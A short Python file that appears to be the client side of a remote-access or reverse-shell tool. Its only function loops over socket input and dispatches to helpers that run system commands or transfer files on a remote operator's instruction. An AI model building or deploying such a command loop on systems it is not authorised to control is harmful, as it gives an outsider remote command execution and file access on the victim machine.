from clientCore.command import executeCommand
from clientCore.download import DownloadFile

def handleConnection(socket):
    print("[+] Handling Connection")
    
    while True:
        user_input = socket.ReceiveData()
        
        print("[+] User Input ", user_input)
        
        if user_input == "1":
            print("[+] Running the system command")
            # create function that will run command
            executeCommand(socket)
        elif user_input == "2":
            print("[+] Downloading File")
            DownloadFile(socket)
        elif user_input == 'q':
            break
        else:
            print("[+] Invalid user input")